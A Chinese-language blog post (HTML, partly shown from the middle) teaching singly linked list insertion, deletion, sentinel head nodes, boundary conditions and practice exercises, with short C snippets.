-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(head==null)&#123;</span><br><span class="line">    head = new_node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>单链表的结点删除操作</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;next = p-&gt;next-&gt;next;</span><br></pre></td></tr></table></figure>
-
-<p>特殊情况：删除最后一个结点</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(head-&gt;next==null)&#123;</span><br><span class="line">    head = null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="简化"><a href="#简化" class="headerlink" title="简化"></a>简化</h3><p>可以看出，无论是插入还是删除都需要考虑特殊情况，比较麻烦。</p>
-<p>这是可以考虑引入<strong>哨兵</strong>。</p>
-<p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/8.jpg" alt="8"></p>
-<p>我们让head一直指向这个哨兵结点，哨兵结点内不存储任何数据，我们把这种链表称为<strong>带头链表</strong>。</p>
-<p>在这种情况下，我们插入、删除都可以利用上面的一般表达式。</p>
-<h2 id="重点留意边界条件处理"><a href="#重点留意边界条件处理" class="headerlink" title="重点留意边界条件处理"></a>重点留意边界条件处理</h2><ol>
-<li>如果链表为空</li>
-<li>如果链表只包含一个结点</li>
-<li>如果链表只包含两个结点</li>
-<li>代码逻辑在处理头结点和尾结点时</li>
-</ol>
-<h2 id="多写多练"><a href="#多写多练" class="headerlink" title="多写多练"></a>多写多练</h2><ul>
-<li>单链表反转</li>
-<li>链表中环的检测</li>
-<li>两个有序链表的合并</li>
-<li>删除链表倒数第n个结点</li>
-<li>求链表的中间结点</li>
-</ul>
 </div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/">&lt;i class&#x3D;&quot;fa fa-chevron-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/3/">&lt;i class&#x3D;&quot;fa fa-chevron-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By George</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
   $('#nav').addClass('is-mobile')
   $('footer').addClass('is-mobile')
